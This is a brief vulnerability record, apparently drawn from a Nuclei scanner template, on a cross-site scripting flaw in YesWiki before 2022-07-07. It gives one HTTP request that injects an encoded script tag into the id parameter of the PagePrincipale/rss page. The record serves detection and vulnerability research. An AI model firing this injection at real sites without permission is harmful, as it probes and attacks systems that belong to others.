# Vulnerability: YesWiki <2022-07-07 - Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`yeswiki-xss.yaml`)

## Description
YesWiki before 2022-07-07 contains a cross-site scripting vulnerability via the id parameter in the AccueiL URL.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/?PagePrincipale/rss&id=1%27%3Cscript%3Ealert(document.domain)%3C/script%3E
```

